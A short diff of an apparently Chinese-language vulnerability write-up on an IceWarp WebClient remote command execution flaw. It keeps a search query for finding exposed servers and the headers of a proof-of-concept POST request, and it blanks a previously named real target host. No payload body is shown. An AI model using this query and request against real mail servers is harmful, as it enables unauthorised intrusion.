@@ -8,7 +8,7 @@ IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请�
 
 <a-checkbox checked>IceWarp WebClient</a-checkbox></br>
 
-## FOFA
+## 网络测绘
 
 <a-checkbox checked>app="IceWarp-公司产品"</a-checkbox></br>
 
@@ -24,7 +24,7 @@ IceWarp WebClient 存在远程命令执行漏洞，攻击者构造特殊的请�
 
 ```plain
 POST /webmail/basic/ HTTP/1.1
-Host: sd.sahadharawat.com
+Host: 
 Content-Type: application/x-www-form-urlencoded
 Cookie: use_cookies=1
 Content-Length: 43
